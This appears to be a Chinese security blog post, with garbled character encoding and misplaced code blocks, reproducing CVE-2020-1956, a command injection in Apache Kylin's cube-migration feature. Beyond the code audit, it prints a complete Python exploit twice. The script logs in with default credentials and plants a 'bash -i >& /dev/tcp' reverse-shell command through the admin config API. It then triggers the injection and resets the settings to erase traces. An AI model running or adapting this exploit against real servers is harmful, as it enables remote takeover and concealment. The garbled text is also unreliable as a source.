> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fdgB0WVoWsFkbDf2hJp3Ag)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

2020 å¹´ 5 æœˆ 22 æ—¥ï¼Œ**CNVD** é€šæŠ¥äº† **Apache Kylin** å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ **CVE-2020-1956**ï¼Œåœ°å€åœ¨ http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 ã€‚

Apache Kylin** æ˜¯ç¾å›½ **Apache** è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼åˆ†æå‹æ•°æ®ä»“åº“ã€‚è¯¥äº§å“ä¸»è¦æä¾› **Hadoop/Spark** ä¹‹ä¸Šçš„ **SQL** æŸ¥è¯¢æ¥å£åŠå¤šç»´åˆ†æï¼ˆ**OLAP**ï¼‰ç­‰åŠŸèƒ½ã€‚

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

Apache Kylin 2.3.0 ~ 2.3.2

Apache Kylin 2.4.0 ~ 2.4.1

Apache Kylin 2.5.0 ~ 2.5.2

Apache Kylin 2.6.0 ~ 2.6.5

Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ

Kylin å®˜æ–¹æ–‡æ¡£

```
POST /kylin/api/cubes/{cube}/{project}/migrate
```

> [!NOTE]
> 
> å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•°

```
apache-kylin-3.0.1\server-base\src\main\java\org\apache\kylin\rest\service\CubeService.java
```

æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç  **admin/KYLIN** ç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7ET7ibLk1Y7zF7HibLH0hZHTx42Fm0BP1UqiaZNYFibD3IJ9BzOsBH0k6Xlg/640?wx_fmt=png)

æŸ¥çœ‹è¿™ä¸ªæ¼æ´ä¿®å¤çš„è¡¥ä¸ Â  Â  æŸ¥çœ‹åœ°å€

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7ELBUSY1vkTglBhlrsJCdaSfsekkbWYWfWDTEheQ9uPDj7s3vq2WicuEQ/640?wx_fmt=png)

è¿™é‡Œå¯ä»¥çœ‹åˆ°æ­¤æ¼æ´æœ‰å…³çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ **srcCfgUri**ã€**dstCfgUri**ã€**projectName**ï¼Œç›¸å…³çš„å‡½æ•°ä¸º **migrateCube**

å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ migrateCube çš„æè¿°

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EMFn46rK1u2p9hU2LouO2miaxdeYMUbFmPZofLjQvbLiaxZBQyd1Fxicmg/640?wx_fmt=png)

```
@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN
            + " or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')")
    public void migrateCube(CubeInstance cube, String projectName) {
        KylinConfig config = cube.getConfig();
        if (!config.isAllowAutoMigrateCube()) {
            throw new InternalErrorException("One click migration is disabled, please contact your ADMIN");
        }

        for (CubeSegment segment : cube.getSegments()) {
            if (segment.getStatus() != SegmentStatusEnum.READY) {
                throw new InternalErrorException(
                        "At least one segment is not in READY state. Please check whether there are Running or Error jobs.");
            }
        }

        String srcCfgUri = config.getAutoMigrateCubeSrcConfig();
        String dstCfgUri = config.getAutoMigrateCubeDestConfig();

        Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), "Source configuration should not be empty.");
        Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), "Destination configuration should not be empty.");

        String stringBuilderstringBuilder = ("%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true");
        String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri,
                cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge());

        logger.info("One click migration cmd: " + cmd);

        CliCommandExecutor exec = new CliCommandExecutor();
        PatternedLogger patternedLogger = new PatternedLogger(logger);

        try {
            exec.execute(cmd, patternedLogger);
        } catch (IOException e) {
            throw new InternalErrorException("Failed to perform one-click migrating", e);
        }
    }
```

ä¸‹è½½ Apache Kylin 3.0.1 çš„æºä»£ç è¿›è¡Œä»£ç å®¡è®¡, å‡ºç°æ¼æ´å‡½æ•°çš„æ–‡ä»¶ä¸ºä»¥ä¸‹è·¯å¾„

```
@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN
            + " or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')")
```

æ‰¾åˆ° **migrateCube** å‡½æ•°

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7ELWKOAPpmm6aNOHTQ2icJ4fV85e5xKUibGMPZibq4qEYr5SoibKEEhibyl1Q/640?wx_fmt=png)

```
public boolean isAllowAutoMigrateCube() {
        return Boolean.parseBoolean(getOptional("kylin.tool.auto-migrate-cube.enabled", FALSE));
    }
```

**PreAuthorize** é‡Œé¢å®šä¹‰äº†è·¯ç”±æƒé™ï¼Œ**ADMIN** æƒé™ã€**ADMINISTRATION** æƒé™å’Œ **MANAGEMENT** æƒé™å¯ä»¥è®¿é—®è¯¥ serviceã€‚

```
String srcCfgUri = config.getAutoMigrateCubeSrcConfig();
        String dstCfgUri = config.getAutoMigrateCubeDestConfig();

        Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), "Source configuration should not be empty.");
        Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri),
                "Destination configuration should not be empty.");
```

åœ¨ 1087 è¡Œåˆ¤æ–­æ˜¯å¦å¼€å¯äº† **MigrateCube** è®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯åˆ™ä¼šæŠ¥é”™

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EB06spcryekU9GyeRUZQGoRxjt9fdlxlamqFKKT2jtkE69Jr309guJw/640?wx_fmt=png)

è·Ÿè¿› **isAllowAutoMigrateCube()** è¿™ä¸ªå‡½æ•°

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EiaicPqibWmxdGr3Sic5zeia9ia7ke8WRIDkSG4wmgOlHVQtgNeNeMVY2mpmA/640?wx_fmt=png)

å¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤çš„é…ç½® **kylin.tool.auto-migrate-cube.enabled** å°±æ˜¯ **Flase**  

```
public String getAutoMigrateCubeSrcConfig() {
return getOptional("kylin.tool.auto-migrate-cube.src-config", "");
    }
public String getAutoMigrateCubeDestConfig() {
return getOptional("kylin.tool.auto-migrate-cube.dest-config", "");
    }
```

åœ¨æ²¡æœ‰å¼€å¯é…ç½® **kylin.tool.auto-migrate-cube.enabled** ä¸º **true** çš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨ **MigrateCube** åˆ™ä¼šå‡ºç°æŠ¥é”™  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EqMZ4wmvVk6O3Z0biaibmBekCpmnmic32pic6qw6Vp1CKJgQ94FgYCdG0Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EKB8mOiaBlTx2ibV0BqnlHNgTVzic2Jrib2SVGD8f4XMMeTsfibeBVkEGnTw/640?wx_fmt=png)

é€šè¿‡ Apache Kylin çš„ SYSTEM æ¨¡å—å¼€å¯ **kylin.tool.auto-migrate-cube.enabled** ä¸º **True**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7E05VeSXV7aMuEekajdR8ymofFpaeQrNn31zOib68NQiaIrNCA2wbNhumA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EppV9YFrAicjA6D6cFVibBokjpsIp6p80K6U2lficwvupACsaETBvWtU9Q/640?wx_fmt=png)

è®¾ç½®åå†å»è¯·æ±‚åˆ™ä¸ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ï¼Œè€Œæ˜¯å‡ºç° **Source configuration should not be empty**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7Ek6dHpwCdrDG4yyib8GibmugPyBUFXIxeicStpetGibPXw5SicClUobLLdQg/640?wx_fmt=png)

è·Ÿè¿›å‡ºç°æŠ¥é”™è¯­å¥çš„ä»£ç å—

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EufPc32Aqrds8VOuOGb42a53c2vodQbWtN6hblvd3towUub8UStXctw/640?wx_fmt=png)

```
String stringBuilder = ("%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true");
        String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri,
                cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge());

        logger.info("One click migration cmd: " + cmd);

        CliCommandExecutor exec = new CliCommandExecutor();
        PatternedLogger patternedLogger = new PatternedLogger(logger);

        try {
            exec.execute(cmd, patternedLogger);
        } catch (IOException e) {
            throw new InternalErrorException("Failed to perform one-click migrating", e);
        }
    }
```

â€

è¿™é‡Œè¿›è¡Œäº†å¯¹ **kylin.tool.auto-migrate-cube.src-config** å’Œ **kylin.tool.auto-migrate-cube.dest-config** çš„é…ç½®è¿›è¡Œäº†æ£€æµ‹

, å¦‚æœä¸ºç©ºåˆ™ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™

è·Ÿè¿› **getAutoMigrateCubeSrcConfig()** å’Œ **getAutoMigrateCubeDestConfig()** å‡½æ•°

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EAXTwGojp5GQNvVct9EFhXJTV8P9cEKiawPnULomcbRuZ4It0PSOaDpQ/640?wx_fmt=png)

```
private Pair<Integer, String> runRemoteCommand(String command, Logger logAppender) throws IOException {
        SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd);

        SSHClientOutput sshOutput;
        try {
            sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender);
            int exitCode = sshOutput.getExitCode();
            String output = sshOutput.getText();
            return Pair.newPair(exitCode, output);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            throw new IOException(e.getMessage(), e);
        }
    }

    private Pair<Integer, String> runNativeCommand(String command, Logger logAppender) throws IOException {
        String[] cmd = new String[3];
        String osName = System.getProperty("os.name");
        if (osName.startsWith("Windows")) {
            cmd[0] = "cmd.exe";
            cmd[1] = "/C";
        } else {
            cmd[0] = "/bin/bash";
            cmd[1] = "-c";
        }
        cmd[2] = command;

        ProcessBuilder builder = new ProcessBuilder(cmd);
        builder.redirectErrorStream(true);
        Process proc = builder.start();

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8));
        String line;
        StringBuilder result = new StringBuilder();
        while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) {
            result.append(line).append('\n');
            if (logAppender != null) {
                logAppender.log(line);
            }
        }

        if (Thread.interrupted()) {
            logger.info("CliCommandExecutor is interruppted by other, kill the sub process: " + command);
            proc.destroy();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // do nothing
            }
            return Pair.newPair(1, "Killed");
        }

        try {
            int exitCode = proc.waitFor();
            return Pair.newPair(exitCode, result.toString());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException(e);
        }
    }

}
```

å‘ç°è¿™ä¸¤ä¸ªé…ç½®é»˜è®¤ä¸ºç©ºï¼Œå› ä¸ºé…ç½®å…è®¸è‡ªå®šä¹‰ï¼Œæ‰€ä»¥ srcCfgUri å’Œ dstCfgUri ä¸¤ä¸ªå˜é‡å‡æ˜¯å¯æ§çš„

ç»§ç»­å‘ä¸‹èµ°ï¼Œå‘ç°ä¸€å¤„**å‘½ä»¤æ‹¼æ¥**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7E06UNHMfhsENkyFBr59pChwAelHePI1gvlt54ChWalc90V9CfLiaibn7g/640?wx_fmt=png)

```
kylin.tool.auto-migrate-cube.enabled=true
kylin.tool.auto-migrate-cube.src-config=echo;bashÂ -iÂ >&Â /dev/tcp/xxx.xxx.xxx.xxx/9999Â 0>&1
kylin.tool.auto-migrate-cube.dest-config=shell
```

è¿›å…¥åˆ° **execute** å‡½æ•°

```
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Apache Kylin <= 3.0.1                                    \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-1956                                    \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:7070                            \033[0m')
    print('+  \033[36mLogin  >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass)                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    login_url = target_url + "/kylin/api/user/authentication"
    user_pass = str(input("\033[35mPlease input User and Pass\nLogin >>> \033[0m"))

    Authorization = "Basic " + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Cookie": "project=null"
    }
    try:
        response = requests.post(url=login_url, headers=headers, timeout=20)
        if "password" not in response.text:
            print("\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \033[0m")
            sys.exit(0)
        else:
            print("\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š" + response.cookies["JSESSIONID"] + "\033[0m")
            return response.cookies["JSESSIONID"],Authorization
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\033[0m")
        sys.exit(0)

def POC_2(target_url, cookie, IP, PORT, Authorization):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled","kylin.tool.auto-migrate-cube.src-config","kylin.tool.auto-migrate-cube.dest-config"]
    value = ["true","echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo".format(IP, PORT), "shell"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID="+cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] æˆåŠŸå°†" + key[i] +"è®¾ç½®ä¸º" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] è®¾ç½®" + key[i] +"ä¸º" + value[i] +"å¤±è´¥\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
            sys.exit(0)

def POC_3(target_url, cookie):
    print("\033[35m[o] æ­£åœ¨åå¼¹shell......\033[0m")
    vuln_url = target_url + "/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    try:
        response = requests.post(url=vuln_url, headers=headers)
        POC_4(target_url, cookie)
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
        sys.exit(0)

def POC_4(target_url, cookie):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled", "kylin.tool.auto-migrate-cube.src-config",
           "kylin.tool.auto-migrate-cube.dest-config"]
    value = ["flase", "echo;echo;echo", "None"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }

    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] æˆåŠŸå°†" + key[i] +"è®¾ç½®ä¸º" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] è®¾ç½®" + key[i] +"ä¸º" + value[i] +"å¤±è´¥\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
            sys.exit(0)
    print("\033[35m[o] æˆåŠŸæ¸…ç†ç—•è¿¹\033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    try:
        cookie,Authorization = POC_1(target_url)
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
        sys.exit(0)
    IP = str(input("\033[35mè¯·è¾“å…¥ç›‘å¬IP   >>> \033[0m"))
    PORT = str(input("\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \033[0m"))
    POC_2(target_url, cookie, IP, PORT, Authorization)
    POC_3(target_url, cookie)
```

ç”±æ­¤å¯ä»¥å¾—å‡ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªå¯æ§çš„å‚æ•°ï¼Œæ‰§è¡Œä»»æ„æˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹ä¸€ä¸ª shellï¼Œè®¾ç½®çš„é…ç½®ä¸º

```
kylin.tool.auto-migrate-cube.enabled=true
kylin.tool.auto-migrate-cube.src-config=echo;bashÂ -iÂ >&Â /dev/tcp/xxx.xxx.xxx.xxx/9999Â 0>&1
kylin.tool.auto-migrate-cube.dest-config=shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EUVvibV1f70xc7GsX1fuzBiaibEseNJlI7Rtoq78g3ck3VILN916hMd7Rw/640?wx_fmt=png)

å†å»å‘é€ POST è¯·æ±‚ **/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EXeB5HgwmTot9pdcezED3K4tvBAicecmDXsq0oI1PZ7D73BoheB7Nw9A/640?wx_fmt=png)

æˆåŠŸåå¼¹ä¸€ä¸ª shell  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7EI0NLR6UoZfvoatK5ciaBIkX28K5XEwrPIzdZrQCFUodN64xGKMKv5Lg/640?wx_fmt=png)

æ¼æ´åˆ©ç”¨ POC
--------

**POC åˆ©ç”¨å‰ææ˜¯æ‹¥æœ‰è´¦å·å¯†ç ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯ admin/KYLIN**

```
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech
import requests
import base64
import sys
def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Apache Kylin <= 3.0.1                                    \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-1956                                    \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:7070                            \033[0m')
    print('+  \033[36mLogin  >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass)                            \033[0m')
    print('+------------------------------------------')
def POC_1(target_url):
    login_url = target_url + "/kylin/api/user/authentication"
    user_pass = str(input("\033[35mPlease input User and Pass\nLogin >>> \033[0m"))
    Authorization = "Basic " + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Cookie": "project=null"
    }
    try:
        response = requests.post(url=login_url, headers=headers, timeout=20)
        if "password" not in response.text:
            print("\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \033[0m")
            sys.exit(0)
        else:
            print("\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š" + response.cookies["JSESSIONID"] + "\033[0m")
            return response.cookies["JSESSIONID"],Authorization
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\033[0m")
        sys.exit(0)
def POC_2(target_url, cookie, IP, PORT, Authorization):
    config_url = target_url + "/kylin/api/admin/config"
    key = ["kylin.tool.auto-migrate-cube.enabled","kylin.tool.auto-migrate-cube.src-config","kylin.tool.auto-migrate-cube.dest-config"]
    value = ["true","echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo".format(IP, PORT), "shell"]
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID="+cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] æˆåŠŸå°†" + key[i] +"è®¾ç½®ä¸º" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] è®¾ç½®" + key[i] +"ä¸º" + value[i] +"å¤±è´¥\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
            sys.exit(0)
def POC_3(target_url, cookie):
    print("\033[35m[o] æ­£åœ¨åå¼¹shell......\033[0m")
    vuln_url = target_url + "/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    try:
        response = requests.post(url=vuln_url, headers=headers)
        POC_4(target_url, cookie)
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
        sys.exit(0)
def POC_4(target_url, cookie):
    config_url = target_url + "/kylin/api/admin/config"
    key = ["kylin.tool.auto-migrate-cube.enabled", "kylin.tool.auto-migrate-cube.src-config",
           "kylin.tool.auto-migrate-cube.dest-config"]
    value = ["flase", "echo;echo;echo", "None"]
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] æˆåŠŸå°†" + key[i] +"è®¾ç½®ä¸º" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] è®¾ç½®" + key[i] +"ä¸º" + value[i] +"å¤±è´¥\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
            sys.exit(0)
    print("\033[35m[o] æˆåŠŸæ¸…ç†ç—•è¿¹\033[0m")
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    try:
        cookie,Authorization = POC_1(target_url)
    except:
        print("\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \033[0m")
        sys.exit(0)
    IP = str(input("\033[35mè¯·è¾“å…¥ç›‘å¬IP   >>> \033[0m"))
    PORT = str(input("\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \033[0m"))
    POC_2(target_url, cookie, IP, PORT, Authorization)
    POC_3(target_url, cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el57b8IfopfgCseiaeLqFYp7E0UicDGWfH4COaKWGQMDBqU236ic7lohXq1XibcOHwe1RAIYUsSUhdKRvw/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“å’Œå›¢é˜Ÿçš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro7uWKGayI2RguaLia8VfTDystgmyZaEk15WcXU9v4WtULgysUGicYFGMQA/640?wx_fmt=png)